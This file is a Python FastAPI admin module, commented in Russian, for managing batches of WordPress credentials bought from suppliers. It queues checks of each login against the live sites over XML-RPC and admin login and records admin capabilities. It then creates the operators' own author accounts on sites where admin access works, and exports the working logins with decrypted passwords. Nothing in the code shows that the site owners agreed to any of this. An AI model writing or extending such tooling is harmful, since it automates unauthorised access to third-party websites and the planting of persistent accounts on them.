"""/admin/api/batches — WP credentials import batches."""

from __future__ import annotations

import csv
import io
import json
from collections.abc import AsyncIterator

import structlog
from fastapi import APIRouter, Depends, File, Form, HTTPException, Query, UploadFile, status
from fastapi.responses import StreamingResponse
from sqlalchemy.ext.asyncio import AsyncSession

from api.admin.middleware.auth import require_page_access, require_super_admin
from api.admin.schemas.wp_batches import (
    BatchCredEntry,
    BatchCredListResponse,
    CreateBatchImportResult,
    ForceCredStatusRequest,
    ProvisionRequest,
    ValidateBatchRequest,
    WpBatchListResponse,
    WpBatchResponse,
)
from core.crypto import decrypt_password
from core.db import get_db_read, get_db_write
from datetime import UTC, datetime
from sqlalchemy import and_, or_, select, update
from sqlalchemy.orm import selectinload

from core.config import settings
from infrastructure.db.models import WpCredential
from domain.wp_batches.service import (
    compute_batch_counters,
    get_batch,
    import_csv_as_batch,
    iter_batch_result_rows,
    list_batches,
    request_pause as request_pause_batch,
    soft_delete_batch,
)
from infrastructure.db.models import AdminUser, WpBatchStatus, WpImportBatch


def _batch_to_response(
    batch: WpImportBatch, counters: dict[str, int], *, hide_provisioning: bool = False
) -> WpBatchResponse:
    """Сериализация ORM + override счётчиков live-данными.
    hide_provisioning — для поставщика: не показываем «наши аккаунты»."""
    return WpBatchResponse(
        id=batch.id,
        name=batch.name,
        tag=batch.tag,
        note=batch.note,
        cost_total=float(batch.cost_total) if batch.cost_total is not None else None,
        cost_currency=batch.cost_currency,
        source_filename=batch.source_filename,
        status=batch.status,
        total_credentials=batch.total_credentials,
        duplicate_credentials=batch.duplicate_credentials,
        valid_count=counters.get("valid", 0),
        valid_xmlrpc_count=counters.get("valid_xmlrpc", 0),
        valid_admin_count=counters.get("valid_admin", 0),
        invalid_count=counters.get("invalid", 0),
        transient_count=counters.get("transient", 0),
        pending_count=counters.get("pending", 0),
        provisioned_count=0 if hide_provisioning else counters.get("provisioned", 0),
        pause_requested=batch.pause_requested,
        validation_started_at=batch.validation_started_at,
        validation_finished_at=batch.validation_finished_at,
        created_by_user_id=batch.created_by_user_id,
        created_at=batch.created_at,
    )


def _can_access_batch(b: WpImportBatch, viewer: AdminUser) -> bool:
    """super_admin видит все батчи; остальные (supplier) — только свои."""
    return viewer.is_super_admin or b.created_by_user_id == viewer.id


async def _batch_or_404(session: AsyncSession, batch_id: int, viewer: AdminUser) -> WpImportBatch:
    """Достать батч с проверкой доступа. Чужой/несуществующий → 404."""
    b = await get_batch(session, batch_id)
    if b is None or not _can_access_batch(b, viewer):
        raise HTTPException(status_code=404, detail="Batch not found")
    return b

log = structlog.get_logger(__name__)

router = APIRouter(prefix="/batches", tags=["batches"])


# ─── List ────────────────────────────────────────────────────────────


@router.get("", response_model=WpBatchListResponse)
async def list_endpoint(
    limit: int = 100,
    viewer: AdminUser = Depends(require_page_access("/batches")),
    session: AsyncSession = Depends(get_db_read),
) -> WpBatchListResponse:
    # Не-super (supplier) видит только свои батчи.
    owner = None if viewer.is_super_admin else viewer.id
    rows = await list_batches(session, limit=limit, owner_id=owner)
    counters = await compute_batch_counters(session, [b.id for b in rows])
    hide = not viewer.is_super_admin
    return WpBatchListResponse(
        items=[_batch_to_response(b, counters.get(b.id, {}), hide_provisioning=hide) for b in rows]
    )


@router.get("/{batch_id}", response_model=WpBatchResponse)
async def get_endpoint(
    batch_id: int,
    viewer: AdminUser = Depends(require_page_access("/batches")),
    session: AsyncSession = Depends(get_db_read),
) -> WpBatchResponse:
    b = await _batch_or_404(session, batch_id, viewer)
    counters = await compute_batch_counters(session, [b.id])
    return _batch_to_response(b, counters.get(b.id, {}),
                              hide_provisioning=not viewer.is_super_admin)


@router.get("/{batch_id}/credentials", response_model=BatchCredListResponse)
async def list_credentials_endpoint(
    batch_id: int,
    # Принимаем оба имени: исторически в коде `status_filter`, но frontend
    # уже шлёт компактно `status=valid`. Без alias параметр игнорировался
    # молча и таблица всегда показывала все рекорды.
    status_filter: str | None = Query(default=None, alias="status"),
    search: str | None = None,         # domain/login like
    after_id: int | None = None,
    limit: int = 200,
    include_password: bool = False,    # пароли своего батча (или super_admin)
    viewer: AdminUser = Depends(require_page_access("/batches")),
    session: AsyncSession = Depends(get_db_read),
) -> BatchCredListResponse:
    b = await _batch_or_404(session, batch_id, viewer)
    hide_prov = not viewer.is_super_admin

    # Спец-фильтр "duplicates": cred-«оригиналы», найденные как дубли при импорте
    # этого batch (лежат в ДРУГИХ батчах). super_admin видит полную карточку.
    # Поставщику отдаём ТОЛЬКО domain+login (это его же присланные данные) —
    # без пароля/статуса/каналов/владельца оригинала (чужие доступы не палим).
    if status_filter == "duplicates":
        dup_ids = list(b.duplicate_cred_ids or [])
        if not dup_ids:
            return BatchCredListResponse(items=[], has_more=False)
        stmt = (
            select(WpCredential)
            .where(
                WpCredential.id.in_(dup_ids),
                WpCredential.deleted_at.is_(None),
            )
            .options(selectinload(WpCredential.site))
            .order_by(WpCredential.id)
            .limit(limit + 1)
        )
        if search:
            like = f"%{search.strip()}%"
            from infrastructure.db.models import WpSite as _WpSite

            stmt = stmt.join(_WpSite, _WpSite.id == WpCredential.site_id).where(
                or_(WpCredential.login.ilike(like), _WpSite.domain.ilike(like))
            )
        if after_id:
            stmt = stmt.where(WpCredential.id > after_id)
        rows = list((await session.execute(stmt)).scalars().unique().all())
        has_more = len(rows) > limit
        if has_more:
            rows = rows[:limit]
        items = []
        for c in rows:
            if hide_prov:
                # Поставщик: только domain+login + маркер kind='duplicate'.
                items.append(BatchCredEntry(
                    id=c.id,
                    site_id=c.site_id,
                    domain=c.site.domain if c.site else "",
                    language=None,
                    login=c.login,
                    is_valid=False,
                    last_validation_kind="duplicate",
                    last_validated_at=None,
                    error_counter=0,
                    last_error_at=None,
                    error_cooldown_until=None,
                    last_used_at=None,
                    amount_use=0,
                    created_at=c.created_at,
                    import_batch_id=None,
                ))
                continue
            items.append(BatchCredEntry(
                id=c.id,
                site_id=c.site_id,
                domain=c.site.domain if c.site else "",
                language=c.site.language if c.site else None,
                language_detected_at=c.site.language_detected_at if c.site else None,
                login=c.login,
                password=None,
                tags=c.tags,
                is_valid=c.is_valid,
                last_validated_at=c.last_validated_at,
                last_validation_kind=c.last_validation_kind,
                last_error_message=c.last_error_message,
                error_counter=c.error_counter or 0,
                last_error_at=c.last_error_at,
                error_cooldown_until=c.error_cooldown_until,
                last_used_at=c.last_used_at,
                amount_use=c.amount_use or 0,
                created_at=c.created_at,
                can_xmlrpc=c.can_xmlrpc,
                can_admin_login=c.can_admin_login,
                can_post_via_xmlrpc=c.can_post_via_xmlrpc,
                can_post_via_admin=c.can_post_via_admin,
                can_create_users=c.can_create_users,
                admin_role=c.admin_role,
                last_admin_check_at=c.last_admin_check_at,
                provisioned=c.provisioned,
                provisioned_at=c.provisioned_at,
                provisioned_via=c.provisioned_via,
                import_batch_id=c.import_batch_id,
            ))
        return BatchCredListResponse(items=items, has_more=has_more)

    stmt = (
        select(WpCredential)
        .where(
            WpCredential.import_batch_id == batch_id,
            WpCredential.deleted_at.is_(None),
        )
        .options(selectinload(WpCredential.site))
        .order_by(WpCredential.id)
        .limit(limit + 1)
    )
    # Фильтры — прямо по generated column cred_status (единый источник истины).
    if status_filter in ("valid", "invalid", "transient", "pending"):
        stmt = stmt.where(WpCredential.cred_status == status_filter)
    if search:
        like = f"%{search.strip()}%"
        from infrastructure.db.models import WpSite as _WpSite

        stmt = stmt.join(_WpSite, _WpSite.id == WpCredential.site_id).where(
            or_(WpCredential.login.ilike(like), _WpSite.domain.ilike(like))
        )
    if after_id:
        stmt = stmt.where(WpCredential.id > after_id)

    rows = list((await session.execute(stmt)).scalars().unique().all())
    has_more = len(rows) > limit
    if has_more:
        rows = rows[:limit]

    # «Где удалось создать наш аккаунт»: provisioned-кред лежит вне батча, но
    # ссылается на admin-кред через provisioned_by_cred_id. Собираем set таких
    # admin-кредов среди показываемых, чтобы поставить пометку на строке.
    prov_via_ids: set[int] = set()
    if rows and not hide_prov:
        prov_via_ids = set((await session.scalars(
            select(WpCredential.provisioned_by_cred_id).where(
                WpCredential.provisioned.is_(True),
                WpCredential.deleted_at.is_(None),
                WpCredential.provisioned_by_cred_id.in_([c.id for c in rows]),
            ))).all())

    # Доступ к батчу уже проверен (_batch_or_404): super_admin или владелец.
    # Поставщик видит пароли СВОЕГО батча (он их и дал). Аудит-лог факта.
    reveal_passwords = include_password
    if reveal_passwords:
        log.warning(
            "batches.password_revealed", actor_id=viewer.id,
            batch_id=batch_id, count=len(rows),
        )

    items: list[BatchCredEntry] = []
    for c in rows:
        site = c.site
        pw_out: str | None = None
        if reveal_passwords and c.password:
            try:
                pw_out = decrypt_password(c.password)
            except Exception as e:
                log.warning("batches.decrypt_failed", cred_id=c.id, error=str(e))
        items.append(BatchCredEntry(
            id=c.id,
            site_id=c.site_id,
            domain=site.domain if site else "",
            language=site.language if site else None,
            language_detected_at=site.language_detected_at if site else None,
            login=c.login,
            password=pw_out,
            tags=c.tags,
            is_valid=c.is_valid,
            last_validated_at=c.last_validated_at,
            last_validation_kind=c.last_validation_kind,
            last_error_message=c.last_error_message,
            error_counter=c.error_counter or 0,
            last_error_at=c.last_error_at,
            error_cooldown_until=c.error_cooldown_until,
            last_used_at=c.last_used_at,
            amount_use=c.amount_use or 0,
            created_at=c.created_at,
            # Capability matrix (Tier 1+2 discovery)
            can_xmlrpc=c.can_xmlrpc,
            can_admin_login=c.can_admin_login,
            can_post_via_xmlrpc=c.can_post_via_xmlrpc,
            can_post_via_admin=c.can_post_via_admin,
            can_create_users=c.can_create_users,
            admin_role=c.admin_role,
            last_admin_check_at=c.last_admin_check_at,
            # provisioning скрываем от поставщика (наши аккаунты — не его дело)
            provisioned=False if hide_prov else c.provisioned,
            provisioned_at=None if hide_prov else c.provisioned_at,
            provisioned_via=None if hide_prov else c.provisioned_via,
            provisioned_here=False if hide_prov else (c.id in prov_via_ids),
            import_batch_id=c.import_batch_id,
        ))
    return BatchCredListResponse(items=items, has_more=has_more)


# ─── Create from CSV ─────────────────────────────────────────────────


@router.post("", response_model=CreateBatchImportResult, status_code=status.HTTP_201_CREATED)
async def create_endpoint(
    file: UploadFile = File(...),
    name: str = Form(...),
    tag: str | None = Form(default=None),
    note: str | None = Form(default=None),
    cost_total: float | None = Form(default=None),
    cost_currency: str | None = Form(default=None),
    # «Сразу работает»: после импорта автоматически гоним полный цикл —
    # full-валидацию (XML-RPC + admin + роль + capabilities) по всему батчу и
    # создаём наш author-аккаунт на admin-сайтах. По умолчанию вкл.
    auto_validate: bool = Form(default=True),
    auto_provision: bool = Form(default=True),
    actor: AdminUser = Depends(require_page_access("/batches")),
    session: AsyncSession = Depends(get_db_write),
) -> CreateBatchImportResult:
    # Поставщик (не-super): провижн наших аккаунтов запрещён, валидация — medium.
    is_super = actor.is_super_admin
    if not is_super:
        auto_provision = False
    if not file.filename or not file.filename.lower().endswith((".csv", ".txt")):
        raise HTTPException(
            status_code=400,
            detail="Only .csv (header: domain,login,password) or .txt "
                   "(tab-separated: domain url [num] login password) files supported",
        )
    contents = await file.read()
    if len(contents) > 50 * 1024 * 1024:
        raise HTTPException(status_code=413, detail="File too large (>50 MB)")
    try:
        res = await import_csv_as_batch(
            session,
            csv_bytes=contents,
            name=name,
            tag=tag,
            note=note,
            cost_total=cost_total,
            cost_currency=cost_currency,
            source_filename=file.filename,
            creator=actor,
        )
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e)) from e
    log.info("batches.created", actor_id=actor.id, batch_id=res.batch_id)
    from domain.audit.service import record as audit_record
    await audit_record(
        session, actor=actor, action="batches.created",
        resource_type="wp_import_batch", resource_id=res.batch_id,
        changes={"name": name, "credentials_new": res.credentials_new,
                 "credentials_duplicate": res.credentials_duplicate},
    )

    # «Сразу работает»: автозапуск полного цикла по всему батчу сразу после
    # импорта — full-валидация (Tier 1 XML-RPC + Tier 2 admin + роль +
    # capabilities) + provision нашего author-аккаунта. Только если в батч
    # реально попали новые креды (иначе валидировать нечего).
    validation_started = False
    if auto_validate and res.credentials_new > 0:
        from workers.taskiq.cron_tasks import validate_batch_task

        await validate_batch_task.kiq(
            batch_id=res.batch_id,
            scope="all",
            concurrency=5 if is_super else 8,
            proxy_id=None,
            detect_lang=True,
            actor_id=actor.id,
            level="full" if is_super else "medium",
            provision_after=auto_provision,
            provision_role="author",
        )
        validation_started = True
        log.info(
            "batches.autovalidate.triggered",
            batch_id=res.batch_id, actor_id=actor.id,
            level="full", provision=auto_provision,
        )

    return CreateBatchImportResult(**res.__dict__, validation_started=validation_started)


# ─── Validate / Pause / Resume / Re-validate failed ─────────────────


@router.post("/{batch_id}/validate", status_code=status.HTTP_202_ACCEPTED)
async def validate_endpoint(
    batch_id: int,
    payload: ValidateBatchRequest,
    actor: AdminUser = Depends(require_page_access("/batches")),
    session: AsyncSession = Depends(get_db_write),
) -> dict:
    b = await _batch_or_404(session, batch_id, actor)
    if b.status == WpBatchStatus.VALIDATING.value:
        raise HTTPException(status_code=409, detail="Validation already running")

    # Поставщик: форсим безопасные параметры (никакого провижна/выбора прокси,
    # фиксированный level). super_admin — как просил.
    is_super = actor.is_super_admin
    level = payload.level if is_super else "medium"
    proxy_id = payload.proxy_id if is_super else None
    provision_after = payload.provision_after if is_super else False
    # super: явное значение из диалога или серверный дефолт; supplier: фикс 8.
    concurrency = (payload.concurrency or settings.DEFAULT_VALIDATION_CONCURRENCY) if is_super else 8

    from workers.taskiq.cron_tasks import validate_batch_task

    await validate_batch_task.kiq(
        batch_id=batch_id,
        scope=payload.scope,
        concurrency=concurrency,
        proxy_id=proxy_id,
        detect_lang=payload.detect_language,
        actor_id=actor.id,
        level=level,
        provision_after=provision_after,
        provision_role=payload.provision_role,
    )
    log.info(
        "batches.validate.triggered",
        actor_id=actor.id, batch_id=batch_id, scope=payload.scope, level=level,
    )
    return {"ok": True, "scope": payload.scope, "level": level}


@router.get("/{batch_id}/provision-count")
async def provision_count_endpoint(
    batch_id: int,
    actor: AdminUser = Depends(require_super_admin),
    session: AsyncSession = Depends(get_db_read),
) -> dict:
    """Превью: сколько сайтов батча получат наш аккаунт (есть admin-доступ +
    create_users, наш cred ещё не создан)."""
    from domain.wp_provision import count_provisionable

    n = await count_provisionable(session, batch_id=batch_id)
    return {"batch_id": batch_id, "provisionable": n}


@router.post("/{batch_id}/provision", status_code=status.HTTP_202_ACCEPTED)
async def provision_endpoint(
    batch_id: int,
    payload: ProvisionRequest,
    actor: AdminUser = Depends(require_super_admin),
    session: AsyncSession = Depends(get_db_write),
) -> dict:
    """Создать наши аккаунты на сайтах батча, где их ещё нет (фоновая задача)."""
    b = await get_batch(session, batch_id)
    if b is None:
        raise HTTPException(status_code=404, detail="Batch not found")
    from domain.wp_provision import count_provisionable

    n = await count_provisionable(session, batch_id=batch_id)

    from workers.taskiq.cron_tasks import provision_batch_task

    await provision_batch_task.kiq(
        batch_id=batch_id, role=payload.role,
        concurrency=payload.concurrency, actor_id=actor.id,
    )
    from domain.audit.service import record
    await record(
        session, actor=actor, action="wp_batches.provision",
        resource_type="wp_batch", resource_id=batch_id,
        changes={"role": payload.role, "provisionable": n},
    )
    log.info("batches.provision.triggered", actor_id=actor.id, batch_id=batch_id,
             role=payload.role, provisionable=n)
    return {"ok": True, "batch_id": batch_id, "role": payload.role, "provisionable": n}


@router.post("/{batch_id}/pause", status_code=status.HTTP_204_NO_CONTENT)
async def pause_endpoint(
    batch_id: int,
    actor: AdminUser = Depends(require_page_access("/batches")),
    session: AsyncSession = Depends(get_db_write),
):
    b = await _batch_or_404(session, batch_id, actor)
    if b.status != WpBatchStatus.VALIDATING.value:
        raise HTTPException(status_code=409, detail=f"Cannot pause in status '{b.status}'")
    await request_pause_batch(session, batch_id)
    log.info("batches.pause", actor_id=actor.id, batch_id=batch_id)


@router.post("/{batch_id}/resume", status_code=status.HTTP_202_ACCEPTED)
async def resume_endpoint(
    batch_id: int,
    actor: AdminUser = Depends(require_page_access("/batches")),
    session: AsyncSession = Depends(get_db_write),
) -> dict:
    """Resume — пере-запуск валидации в scope='all' (cooldown сам пропустит
    тех, кого уже проверили)."""
    b = await _batch_or_404(session, batch_id, actor)
    # VALIDATING тоже допускаем: батч мог застрять в "pausing" или осиротеть после
    # рестарта воркера (деплой) — даём перезапустить. Снимаем флаг паузы.
    if b.status not in (WpBatchStatus.PAUSED.value, WpBatchStatus.DONE.value,
                        WpBatchStatus.VALIDATING.value):
        raise HTTPException(status_code=409, detail=f"Cannot resume in status '{b.status}'")
    await session.execute(
        update(WpImportBatch).where(WpImportBatch.id == batch_id).values(pause_requested=False))
    await session.commit()
    from workers.taskiq.cron_tasks import validate_batch_task
    # Валидация ВСЕГДА полным циклом: super_admin — full (как импорт/ручной
    # запуск), supplier — фикс medium (ограничение поставщика). Раньше resume
    # форсил light — легаси-артефакт, ронял xmlrpc-disabled сайты в transient.
    level = "full" if actor.is_super_admin else "medium"
    await validate_batch_task.kiq(batch_id=batch_id, scope="all", actor_id=actor.id,
                                  level=level, provision_after=False,
                                  concurrency=settings.DEFAULT_VALIDATION_CONCURRENCY)
    log.info("batches.resume", actor_id=actor.id, batch_id=batch_id, level=level)
    return {"ok": True}


@router.post("/{batch_id}/revalidate-failed", status_code=status.HTTP_202_ACCEPTED)
async def revalidate_failed_endpoint(
    batch_id: int,
    actor: AdminUser = Depends(require_page_access("/batches")),
    session: AsyncSession = Depends(get_db_write),
) -> dict:
    b = await _batch_or_404(session, batch_id, actor)
    from workers.taskiq.cron_tasks import validate_batch_task
    # Полный цикл (full) для super_admin, medium для поставщика — см. resume.
    level = "full" if actor.is_super_admin else "medium"
    await validate_batch_task.kiq(batch_id=batch_id, scope="invalid", actor_id=actor.id,
                                  level=level, provision_after=False,
                                  concurrency=settings.DEFAULT_VALIDATION_CONCURRENCY)
    log.info("batches.revalidate_failed", actor_id=actor.id, batch_id=batch_id, level=level)
    return {"ok": True}


# ─── Manual override per credential ─────────────────────────────────


@router.post(
    "/{batch_id}/credentials/{cred_id}/force-status",
    status_code=status.HTTP_200_OK,
)
async def force_cred_status_endpoint(
    batch_id: int,
    cred_id: int,
    payload: ForceCredStatusRequest,
    actor: AdminUser = Depends(require_super_admin),
    session: AsyncSession = Depends(get_db_write),
) -> dict:
    """
    Ручной override is_valid для cred-а батча.
      - is_valid=True  → разморозить (сбросить error_counter, cooldown, kind='ok'
        для UI без перевалидации; last_error_message чистим).
      - is_valid=False → пометить инвалидным с kind='manual_invalid'.
    Перевалидацию не запускаем — это явное решение оператора.
    """
    cred = await session.scalar(
        select(WpCredential).where(
            WpCredential.id == cred_id,
            WpCredential.import_batch_id == batch_id,
            WpCredential.deleted_at.is_(None),
        )
    )
    if cred is None:
        raise HTTPException(status_code=404, detail="Credential not found in batch")

    now = datetime.now(UTC)
    if payload.is_valid:
        values = {
            "is_valid": True,
            "error_counter": 0,
            "last_error_at": None,
            "error_cooldown_until": None,
            "last_validation_kind": "manual_valid",
            "last_error_message": None,
            "last_validated_at": now,
        }
    else:
        values = {
            "is_valid": False,
            "last_validation_kind": "manual_invalid",
            "last_validated_at": now,
        }
    await session.execute(update(WpCredential).where(WpCredential.id == cred.id).values(**values))
    await session.commit()
    log.info(
        "batches.force_status",
        actor_id=actor.id,
        batch_id=batch_id,
        cred_id=cred_id,
        is_valid=payload.is_valid,
    )
    from domain.audit.service import record as audit_record
    await audit_record(
        session, actor=actor, action="batches.force_status",
        resource_type="wp_credential", resource_id=cred_id,
        changes={"batch_id": batch_id, "is_valid": payload.is_valid},
    )
    return {"ok": True, "is_valid": payload.is_valid}


# ─── Result CSV ─────────────────────────────────────────────────────


_RESULT_HEADER = [
    "domain", "login", "password",
    "is_valid", "channel", "language", "last_validated_at",
    "error_counter", "last_error",
]


def _cred_to_row(cred, *, include_password: bool) -> dict:
    """Унифицированная сериализация cred → dict для любого формата."""
    site = cred.site
    pw_out = ""
    if include_password and cred.password:
        try:
            pw_out = decrypt_password(cred.password)
        except Exception:
            pw_out = ""
    # Каким tier подтверждён cred (для UI/диагностики)
    if cred.is_valid and cred.last_validation_kind == "ok":
        channel = "rpc"
    elif cred.is_valid and cred.can_admin_login is True:
        channel = "admin"
    else:
        channel = cred.last_validation_kind or ""
    return {
        "domain": (site.domain if site else "") or "",
        "login": cred.login or "",
        "password": pw_out,
        "is_valid": bool(cred.is_valid),
        "channel": channel,
        "language": (site.language if site else "") or "",
        "last_validated_at": cred.last_validated_at.isoformat() if cred.last_validated_at else "",
        "error_counter": int(cred.error_counter or 0),
        "last_error": (cred.last_error_message or "")[:300],
    }


# ─── Stream serializers per format ──────────────────────────────────


async def _stream_csv(
    session, batch_id, *, status_filter, include_password
) -> AsyncIterator[bytes]:
    buf = io.StringIO()
    writer = csv.writer(buf, lineterminator="\n")
    writer.writerow(_RESULT_HEADER)
    yield buf.getvalue().encode("utf-8")
    buf.seek(0); buf.truncate()
    n = 0
    async for cred in iter_batch_result_rows(session, batch_id, status_filter=status_filter):
        row = _cred_to_row(cred, include_password=include_password)
        writer.writerow([
            row["domain"], row["login"], row["password"],
            "true" if row["is_valid"] else "false",
            row["channel"], row["language"], row["last_validated_at"],
            str(row["error_counter"]), row["last_error"],
        ])
        n += 1
        if n % 200 == 0:
            yield buf.getvalue().encode("utf-8")
            buf.seek(0); buf.truncate()
    if buf.tell() > 0:
        yield buf.getvalue().encode("utf-8")


async def _stream_txt(
    session, batch_id, *, status_filter, include_password
) -> AsyncIterator[bytes]:
    """TXT в формате Zebroid: domain<TAB>login<TAB>password (по строке на cred)."""
    async for cred in iter_batch_result_rows(session, batch_id, status_filter=status_filter):
        row = _cred_to_row(cred, include_password=include_password)
        yield f"{row['domain']}\t{row['login']}\t{row['password']}\n".encode("utf-8")


async def _stream_json(
    session, batch_id, *, status_filter, include_password
) -> AsyncIterator[bytes]:
    yield b"["
    first = True
    async for cred in iter_batch_result_rows(session, batch_id, status_filter=status_filter):
        row = _cred_to_row(cred, include_password=include_password)
        prefix = b"" if first else b","
        first = False
        yield prefix + json.dumps(row, ensure_ascii=False).encode("utf-8")
    yield b"]"


async def _build_xlsx_bytes(
    session, batch_id, *, status_filter, include_password
) -> bytes:
    """openpyxl write_only mode — стримит на диск, минимум памяти."""
    from openpyxl import Workbook

    wb = Workbook(write_only=True)
    ws = wb.create_sheet("credentials")
    ws.append(_RESULT_HEADER)
    async for cred in iter_batch_result_rows(session, batch_id, status_filter=status_filter):
        row = _cred_to_row(cred, include_password=include_password)
        ws.append([
            row["domain"], row["login"], row["password"],
            row["is_valid"], row["channel"], row["language"],
            row["last_validated_at"], row["error_counter"], row["last_error"],
        ])
    bio = io.BytesIO()
    wb.save(bio)
    return bio.getvalue()


_FORMAT_TO_MIME = {
    "csv": "text/csv; charset=utf-8",
    "txt": "text/plain; charset=utf-8",
    "json": "application/json; charset=utf-8",
    "xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
}


@router.get("/{batch_id}/export.{fmt}")
async def export_endpoint(
    batch_id: int,
    fmt: str,
    status_filter: str | None = Query(default=None, alias="status"),
    include_password: bool = True,  # свой батч → пароли всегда
    actor: AdminUser = Depends(require_page_access("/batches")),
    session: AsyncSession = Depends(get_db_read),
) -> StreamingResponse:
    fmt = fmt.lower()
    if fmt not in _FORMAT_TO_MIME:
        raise HTTPException(status_code=400, detail=f"Unsupported format: {fmt}")
    b = await _batch_or_404(session, batch_id, actor)

    suffix = f"-{status_filter}" if status_filter else ""
    filename = f"batch-{batch_id}{suffix}.{fmt}"
    log.warning(
        "batches.export", actor_id=actor.id, batch_id=batch_id,
        format=fmt, status_filter=status_filter, include_password=include_password,
    )
    # Экспорт содержит расшифрованные пароли — фиксируем в persisted audit.
    from domain.audit.service import record as audit_record
    await audit_record(
        session, actor=actor, action="batches.export",
        resource_type="wp_import_batch", resource_id=batch_id,
        changes={"format": fmt, "status_filter": status_filter,
                 "include_password": include_password},
    )

    headers = {"Content-Disposition": f'attachment; filename="{filename}"'}

    if fmt == "csv":
        return StreamingResponse(
            _stream_csv(session, batch_id, status_filter=status_filter,
                        include_password=include_password),
            media_type=_FORMAT_TO_MIME[fmt], headers=headers,
        )
    if fmt == "txt":
        return StreamingResponse(
            _stream_txt(session, batch_id, status_filter=status_filter,
                        include_password=include_password),
            media_type=_FORMAT_TO_MIME[fmt], headers=headers,
        )
    if fmt == "json":
        return StreamingResponse(
            _stream_json(session, batch_id, status_filter=status_filter,
                         include_password=include_password),
            media_type=_FORMAT_TO_MIME[fmt], headers=headers,
        )
    # xlsx — целиком в память (openpyxl write_only ok для ~100k rows)
    data = await _build_xlsx_bytes(
        session, batch_id, status_filter=status_filter,
        include_password=include_password,
    )
    return StreamingResponse(
        iter([data]), media_type=_FORMAT_TO_MIME[fmt], headers=headers,
    )


# Back-compat: старый endpoint /result.csv → редирект на новый
@router.get("/{batch_id}/result.csv")
async def result_csv_legacy_endpoint(
    batch_id: int,
    include_password: bool = False,
    actor: AdminUser = Depends(require_page_access("/batches")),
    session: AsyncSession = Depends(get_db_read),
) -> StreamingResponse:
    b = await _batch_or_404(session, batch_id, actor)
    filename = f"batch-{batch_id}-result.csv"
    log.warning(
        "batches.export", actor_id=actor.id, batch_id=batch_id,
        legacy=True, include_password=include_password,
    )
    return StreamingResponse(
        _stream_csv(session, batch_id, status_filter=None,
                    include_password=include_password),
        media_type="text/csv; charset=utf-8",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


# ─── Delete ─────────────────────────────────────────────────────────


@router.delete("/{batch_id}", status_code=status.HTTP_204_NO_CONTENT)
async def delete_endpoint(
    batch_id: int,
    actor: AdminUser = Depends(require_page_access("/batches")),
    session: AsyncSession = Depends(get_db_write),
):
    b = await _batch_or_404(session, batch_id, actor)  # access-check (404) + батч для audit
    await soft_delete_batch(session, batch_id)
    log.info("batches.delete", actor_id=actor.id, batch_id=batch_id)
    from domain.audit.service import record as audit_record
    await audit_record(
        session, actor=actor, action="batches.delete",
        resource_type="wp_import_batch", resource_id=batch_id,
        changes={"name": b.name},
    )
